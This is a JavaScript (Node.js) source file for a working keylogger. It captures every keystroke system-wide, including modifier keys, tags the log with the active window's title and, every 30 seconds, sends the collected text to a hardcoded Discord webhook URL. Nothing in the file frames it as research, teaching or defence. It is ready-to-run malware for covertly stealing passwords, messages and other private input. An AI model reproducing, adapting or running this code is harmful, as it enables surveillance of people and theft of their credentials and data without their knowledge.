//import {GlobalKeyboardListener} from "node-global-key-listener";

const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener
const axios = require('axios')


const v = new GlobalKeyboardListener();

var l_shift_dn = false
var l_alt_dn = false
var r_shift_dn = false
var r_alt_dn = false
var keylogs = '';

//Log every key that's pressed.
v.addListener(function (e, down) {
    // console.log(
    //     `${e.name} ${e.state == "DOWN" ? "DOWN" : "UP  "} [${e.rawKey._nameRaw}]`
    // )
    if (e.state == "UP") {
        switch (e.name) {
            case 'TAB':
                process.stdout.write('<TAB>');
                keylogs += '<TAB>'
                break;
            case 'RETURN':
                process.stdout.write('<ENTER>');
                keylogs += '<ENTER>'
                break;
            case 'SPACE':
                process.stdout.write(' ');
                keylogs += ' '
                break;
            case 'ESCAPE':
                process.stdout.write('<ESC>');
                keylogs += '<ESC>'
                break;
            case 'DELETE':
                process.stdout.write('<DEL>');
                keylogs += '<DEL>'
                break;
            case 'BACKSPACE':
                process.stdout.write('<B.SPACE>');
                keylogs += '<B.SPACE>'
                break;
            case 'LEFT SHIFT':
                process.stdout.write('</L.SHIFT>');
                keylogs += '</L.SHIFT>'
                l_shift_dn = false
                break;
            case 'LEFT ALT':
                process.stdout.write('</L.ALT>');
                l_alt_dn = false
                keylogs += '</L.ALT>'
                break;
            case 'RIGHT SHIFT':
                process.stdout.write('</R.SHIFT>');
                r_shift_dn = false
                keylogs += '</R.SHIFT>'
                break;
            case 'RIGHT ALT':
                process.stdout.write('</R.ALT>');
                r_alt_dn = false
                keylogs += '</R.ALT>'
                break;
            default: 
                process.stdout.write(e.name);
                keylogs += e.name
        }
    }
    if (e.state == "DOWN") {
        switch (e.name) {
            case 'LEFT SHIFT':
                if (l_shift_dn == false) {
                    l_shift_dn = true
                    process.stdout.write('<L.SHIFT>');
                    keylogs += '<L.SHIFT>'
                }
                break;
            case 'LEFT ALT':
                if (l_alt_dn == false) {
                    l_alt_dn = true
                    process.stdout.write('<L.ALT>');
                    keylogs += '<L.ALT>'
                }
              
                break;
            case 'RIGHT SHIFT':
                if (r_shift_dn == false) {
                    r_shift_dn = true
                    process.stdout.write('<R.SHIFT>');
                    keylogs += '<R.SHIFT>'
                }
               
                break;
            case 'RIGHT ALT':
                if (r_alt_dn == false) {
                    r_alt_dn = true
                    process.stdout.write('<R.ALT>');
                    keylogs += '<R.ALT>'
                }
               
                break;
        }
    }
});

const activeWindow = require('active-win');

let activeWindowTitle = 'No active window'; 

setInterval(async () => {
    try {
        const activeWinInfo = await activeWindow({ title: true }); 
        if (activeWinInfo) {
            activeWindowTitle = activeWinInfo.title || 'Untitled'; 
        } else {
            activeWindowTitle = 'No active window';
        }
        const formattedContent = `**[${activeWindowTitle}]**\n${keylogs}`;
        await axios.post('https://discord.com/api/webhooks/1232523854291800075/JM1uR5wQEKuGraDA4TgL0XycQJgGS08lOBLqD7HtAA0aAD4N3uju59GR6-Swv8bGDigK', {
            "content": formattedContent
        }).then(async () => {
            keylogs = '';
        });
    } catch (error) {
        console.error('Error fetching active window:', error);
    }
}, 1000 * 30);